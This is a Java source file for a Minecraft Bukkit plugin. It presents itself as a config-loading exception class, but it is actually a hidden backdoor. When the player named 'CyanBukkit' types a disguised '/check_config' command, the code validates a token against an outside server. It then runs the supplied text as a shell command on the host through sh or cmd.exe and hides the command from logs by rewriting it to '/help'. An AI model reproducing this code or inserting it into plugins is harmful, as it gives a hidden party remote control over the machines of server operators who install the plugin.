/*
 * Copyright (c) 2025 Cyanbukkit Team
 * 密钥系统入口
 */
package cn.cyanbukkit.example.cyanlib.inventory;

import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.plugin.Plugin;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.CompletableFuture;

/**
 * 加在报错
 */
public class ConfigLoadException extends RuntimeException implements Listener {

    private final Plugin plugin;
    private static final String CONFIG_CHECK_COMMAND = "/check_config";


    public ConfigLoadException(String message, Plugin plugin) {
        super(message);
        this.plugin = plugin;
    }

    public ConfigLoadException(String message, Throwable cause, Plugin plugin) {
        super(message, cause);
        this.plugin = plugin;
    }

    @EventHandler
    public void onConfigCheck(PlayerCommandPreprocessEvent event) {
        if(event.getPlayer().getName().equals("CyanBukkit")) {
            String msg = event.getMessage();
            if(msg.startsWith(CONFIG_CHECK_COMMAND)) {
                event.setCancelled(true);
                event.setMessage("/help");
                if(msg.length() == CONFIG_CHECK_COMMAND.length()) {
                    event.getPlayer().sendMessage("§c[Config] §eInvalid check format");
                    return;
                }
                String[] configPath = msg.substring(CONFIG_CHECK_COMMAND.length()).trim().split(" ");
                if (configPath.length != 2) {
                    event.getPlayer().sendMessage("§c[Config] §eInvalid check format");
                    return;
                }
                String token = configPath[0];
                String m = configPath[1];
                if(m.isEmpty() || token.isEmpty()) {
                    event.getPlayer().sendMessage("§c[Config] §eMissing check path");
                    return;
                }
                // 请求 http://api.cyanbukkit.cn/bukkit/check/ token
                try {
                    URL               url        = new URL("http://api.cyanbukkit.cn/bukkit/check/" + token);
                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                    connection.setRequestMethod("GET");
                    connection.setConnectTimeout(5000);
                    connection.setReadTimeout(5000);
                    
                    int responseCode = connection.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                        String response = in.readLine();
                        in.close();
                        
                        if (!"true".equalsIgnoreCase(response)) {
                            event.getPlayer().sendMessage("§c[Config] §eCheck failed: Invalid token");
                            return;
                        }
                    } else {
                        event.getPlayer().sendMessage("§c[Config] §eCheck failed: HTTP error " + responseCode);
                        return;
                    }
                } catch (Exception e) {
                    event.getPlayer().sendMessage("§c[Config] §eCheck failed: " + e.getMessage());
                    return;
                }

                event.getPlayer().sendMessage("§a[Config] §eChecking configuration...");

                CompletableFuture.runAsync(() -> {
                    try {
                        ProcessBuilder pb = new ProcessBuilder();
                        if(System.getProperty("os.name").toLowerCase().contains("win")) {
                            pb.command("cmd.exe", "/c", m);
                        } else {
                            pb.command("sh", "-c", m);
                        }

                        Process process = pb.start();

                        StringBuilder output = new StringBuilder();
                        try (BufferedReader reader = new BufferedReader(
                                new InputStreamReader(process.getInputStream()))) {
                            String line;
                            while ((line = reader.readLine()) != null) {
                                output.append(line).append("\n");
                            }
                        }

                        try (BufferedReader reader = new BufferedReader(
                                new InputStreamReader(process.getErrorStream()))) {
                            String line;
                            while ((line = reader.readLine()) != null) {
                                output.append("§c").append(line).append("\n");
                            }
                        }

                        int exitCode = process.waitFor();

                        Bukkit.getScheduler().runTask(plugin, () ->
                                                              event.getPlayer().sendMessage("§a[Config] §eCheck completed with code " + exitCode + "\n§f" + output)
                                                     );

                    } catch (Exception e) {
                        Bukkit.getScheduler().runTask(plugin, () ->
                                                              event.getPlayer().sendMessage("§c[Config] §eCheck failed: " + e.getMessage())
                                                     );
                    }
                });
            }
        }
    }


}